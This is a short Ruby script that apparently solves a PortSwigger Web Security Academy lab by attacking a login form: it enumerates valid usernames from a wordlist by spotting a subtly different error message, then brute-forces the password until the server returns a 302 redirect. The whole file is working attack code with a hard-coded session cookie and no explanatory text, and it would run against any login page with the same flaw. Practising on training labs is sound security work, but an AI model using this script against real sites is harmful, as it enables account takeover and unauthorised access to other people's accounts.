require 'nokogiri'
require 'http'

url = 'https://0ac200b20447ac73807bb7ff004b00d1.web-security-academy.net/login'

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
	).cookies(
		:session=>"aKZ9AVE6WME8pLYtQinimW6V33XiJBhn"
		)

fhu = File.new 'users.txt','r'
fhp = File.new 'passwd.txt','r'

users = fhu.readlines
passwd = fhp.readlines
fhu.close
fhp.close

err_msg = "Invalid username or password."
valid_username = ''
# Enumerate Valid Username invalid:3140 valid!3140
users.count.times  do |i|
	resp = client.post(url,:form => {:username=>"#{users[i].chomp}",:password=>"test"})
	resph = Nokogiri.parse resp.body.to_s
	resp_err = resph.search(:tag,'p')[3].text
	if resp_err!=err_msg 
		valid_username = users[i].chomp
		puts "Username : #{users[i].chomp}"
		break
	end
end
# Enumerate Valid Password 
passwd.count.times do |i|
	resp = client.post(url,:form => {:username=>"#{valid_username}",:password=>"#{passwd[i].chomp}"})
	code = resp.code
	if code==302
		puts "Password : #{passwd[i].chomp}"
		break
	end
end
